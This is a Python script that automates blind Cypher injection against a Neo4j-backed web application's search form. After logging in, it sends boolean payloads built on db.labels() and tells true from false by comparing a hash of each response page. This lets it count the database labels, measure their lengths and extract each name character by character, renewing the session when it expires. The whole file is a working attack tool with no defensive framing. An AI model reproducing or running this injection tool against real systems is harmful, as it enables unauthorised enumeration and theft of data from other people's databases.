import requests,argparse
from Login import Login
from hashlib import sha256
charset='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~ '
total_label = 0
label_names = []

args = argparse.ArgumentParser()
args.add_argument('-n','--nlabels',default=-1,type=int,required=False,help="Number of labels.If you know them specify here.so program will not look it")
args.add_argument('-U','--url',required=True,type=str)
args.add_argument('-u','--username',default='',type=str,required=True)
args.add_argument('-p','--password',default='',type=str,required=True)
opt = args.parse_args()

session , page_hash = Login(opt.username,opt.password,opt.url)





def GetLabelNumber(url):
    global session,page_hash
    payload = ''
    num = 1
    while True:
        try:
            print(f"[!]Guessing ... using Number {num}")
            payload = "'  AND count {CALL db.labels() YIELD label RETURN label} = "+ f"{num}" +" AND 'a'='a"
            req = requests.post(url+'/search',data={'search':payload},cookies={'session':session,'lang':'en-US'})
            if req.ok:
                if sha256(req.content).hexdigest() != page_hash:
                    return num
                else:
                    num += 1
            else:
                if req.status_code >= 300 and req.status_code <400:
                    print("[!]Session Expired.Renewing...")
                    session , page_hash = Login(opt.username,opt.password,opt.url)
                    continue
                else:
                    return -1

        except Exception as Err:
            print(str(Err))
            return -1
        


def GetLabelNameSize(url,total):
    global session,page_hash
    payload = ''
    size = 0
    szList = []
    search = True
    index = 0
    while index < total:
        while search != False:
            try:
                print(f"Guesing For index: {index} ... using size: {size}")
                payload = "' AND EXISTS {CALL db.labels() YIELD label WITH label SKIP %d LIMIT 1 WHERE size(label) = %d RETURN label} AND 'a'='a"%(index,size)
                req = requests.post(url+'/search',data={'search':payload},cookies={'session':session,'lang':'en-US'})
                if req.ok:
                    if sha256(req.content).hexdigest() != page_hash:
                        szList.append(size)
                        search = False
                    else:
                        #print(f"status {req.status_code}")
                        size += 1
                else:
                    if req.status_code >= 300 and req.status_code <400:
                        print("[!]Session Expired.Renewing...")
                        session , page_hash = Login(opt.username,opt.password,opt.url)
                        continue
                    else:
                        return szList

            except Exception as Err:
                print(str(Err))
                return szList
            
        search = True
        index += 1
        size = 0
        
    return szList



def DumpLabel(url,rowIndex,labelSize):
    global session,page_hash
    payload = ''
    labelName =''
    search = True
    strIndex = 0
    index = 0
    while strIndex < labelSize:
        while search != False:
            try:
                while index < len(charset):
                    character = charset[index]
                    if character == "'":
                        character = "\'"
                    
                    print(f"Guesing For Label Name For index: {strIndex}... using {character} ")
                    
                    payload = "' AND EXISTS {CALL db.labels() YIELD label WITH label SKIP %d LIMIT 1 WHERE substring(label,%d,1) = '%c' RETURN label} AND 'a'='a"%(rowIndex,strIndex,character)
                    req = requests.post(url+'/search',data={'search':payload},cookies={'session':session,'lang':'en-US'})
                    if req.ok:
                        if sha256(req.content).hexdigest() != page_hash:
                            labelName += f'{character}'
                            print(f"[+]Found : RowIndex: {rowIndex} strIndex: {strIndex} - {character}")
                            search = False
                            break
                        else:
                            index += 1
                    else:
                        if req.status_code >= 300 and req.status_code <400:
                            print("\n[!]Session Expired.Renewing...")
                            session , page_hash = Login(opt.username,opt.password,opt.url)
                            print(labelName)
                            continue
                        else:
                            return -1

            except Exception as Err:
                print(str(Err))
                return -1
            
        search = True
        strIndex += 1
        index = 0
    
    return labelName


labels = 0

if opt.nlabels == -1:

    labels = GetLabelNumber(opt.url)
    if labels == -1:
        print("Unable TO Find Label Names")
        exit(0)

else:
    labels = opt.nlabels


print(f"Total Labels : {labels}")

nameSizes = GetLabelNameSize(opt.url,labels)

if nameSizes != -1:
    if len(nameSizes) == 0:
        print("Unable TO Find Label Name size")
        exit(0)

print(nameSizes)

LabelNames = []
for index in range(labels):
    LabelNames.append(DumpLabel(opt.url,index,nameSizes[index]))

print(LabelNames)
